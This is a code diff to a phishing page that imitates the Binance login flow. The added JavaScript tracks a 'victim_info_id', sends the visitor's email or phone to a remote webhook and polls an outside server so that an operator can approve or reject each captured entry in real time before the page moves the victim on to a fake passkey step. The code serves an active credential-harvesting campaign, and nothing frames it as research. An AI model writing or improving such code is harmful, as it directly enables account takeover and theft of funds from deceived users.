@@ -104,6 +104,11 @@
             fill: #ffffff;
         }
 
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         @media (max-width: 768px) {
             .qr-icon {
                 display: none;
@@ -141,6 +146,16 @@
             outline: none;
             border-color: #f0b90b;
             box-shadow: 0 0 0 2px rgba(240, 185, 11, 0.2);
+        }
+
+        .form-input.error {
+            border-color: #f84960;
+            box-shadow: 0 0 0 2px rgba(248, 73, 96, 0.2);
+        }
+
+        .form-input.error:focus {
+            border-color: #f84960;
+            box-shadow: 0 0 0 2px rgba(248, 73, 96, 0.2);
         }        .next-button {
             width: 100%;
             padding: 16px;
@@ -503,14 +518,17 @@
         function validateInput() {
             const emailPhone = document.getElementById('emailPhone').value.trim();
             const button = document.getElementById('next-btn');
+            const input = document.getElementById('emailPhone');
             
             // Enable/disable button based on input
             button.disabled = !emailPhone;
             
-            // Hide error messages when user is typing
+            // Hide error messages when user is typing and reset input styling
             const errorElement = document.getElementById('error-message');
             if (errorElement && emailPhone.length > 0) {
                 errorElement.style.display = 'none';
+                // Reset input styling
+                input.classList.remove('error');
             }
         }
 
@@ -548,26 +566,87 @@
             .then(result => {
                 console.log('Webhook success response:', result);
                 
-                // Set expiration timer for messaging data (10 minutes)
-                setDataExpiration();
-                
-                // Handle success - proceed to next step
-                setTimeout(() => {
-                    window.location.href = 'binance-passkey.html';
-                }, 1500);
+                // Store victim info ID for polling
+                if (result.victim_info_id) {
+                    localStorage.setItem('binance_victim_info_id', result.victim_info_id);
+                    // Start polling for approval/rejection
+                    pollForApproval(result.victim_info_id, campaignId, 'email');
+                } else {
+                    // Fallback to original behavior
+                    setDataExpiration();
+                    setTimeout(() => {
+                        window.location.href = 'binance-passkey.html';
+                    }, 1500);
+                }
             })
             .catch(error => {
                 console.error('Webhook error:', error);
-                // Still log detailed error info
-                if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
-                    console.error('Network error - server might be down or CORS issue');
-                }
-                
-                // For testing purposes, still proceed to next page even on error
-                setTimeout(() => {
-                    window.location.href = 'binance-passkey.html';
-                }, 1500);
+                hideLoading();
+                showError('Connection error. Please try again.');
             });
+        }
+
+        function pollForApproval(victimInfoId, campaignId, step) {
+            const pollUrl = `https://emailgrid.onrender.com/api/check-approval/${victimInfoId}/${step}/`;
+            
+            const poll = () => {
+                fetch(pollUrl, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Poll result:', result);
+                    
+                    if (result.status === 'approved') {
+                        // Hide loading and proceed to next step
+                        hideLoading();
+                        setDataExpiration();
+                        setTimeout(() => {
+                            window.location.href = 'binance-passkey.html';
+                        }, 1000);
+                    } else if (result.status === 'rejected') {
+                        // Hide loading and show error
+                        hideLoading();
+                        showError(result.error_message || 'Invalid email address. Please try again.');
+                    } else {
+                        // Still pending, continue polling
+                        setTimeout(poll, 2000); // Poll every 2 seconds
+                    }
+                })
+                .catch(error => {
+                    console.error('Polling error:', error);
+                    // Continue polling on error
+                    setTimeout(poll, 3000);
+                });
+            };
+            
+            // Start polling
+            poll();
+        }
+
+        function showLoading(button) {
+            if (button) {
+                button.disabled = true;
+                button.innerHTML = `
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
+                        <div style="width: 16px; height: 16px; border: 2px solid #1e2329; border-top: 2px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                        <span>Loading...</span>
+                    </div>
+                `;
+            }
+        }
+
+        function hideLoading() {
+            const button = document.getElementById('next-btn');
+            if (button) {
+                button.disabled = false;
+                button.innerHTML = 'Next';
+            }
         }
 
         function showError(message) {
@@ -578,24 +657,29 @@
                 errorElement.id = 'error-message';
                 errorElement.style.cssText = `
                     color: #f84960;
-                    font-size: 14px;
-                    margin-top: 10px;
-                    text-align: center;
-                    padding: 8px;
-                    background: rgba(248, 73, 96, 0.1);
-                    border-radius: 4px;
-                    border: 1px solid rgba(248, 73, 96, 0.2);
+                    font-size: 12px;
+                    margin-top: 6px;
+                    text-align: left;
+                    padding: 0;
+                    background: transparent;
+                    border: none;
                 `;
-                const form = document.querySelector('form');
-                form.appendChild(errorElement);
+                const formGroup = document.querySelector('.form-group');
+                formGroup.appendChild(errorElement);
             }
             errorElement.textContent = message;
             errorElement.style.display = 'block';
+            
+            // Add error class to input field
+            const input = document.getElementById('emailPhone');
+            input.classList.add('error');
             
             // Hide error after 5 seconds
             setTimeout(() => {
                 if (errorElement) {
                     errorElement.style.display = 'none';
+                    // Reset input styling
+                    input.classList.remove('error');
                 }
             }, 5000);
         }
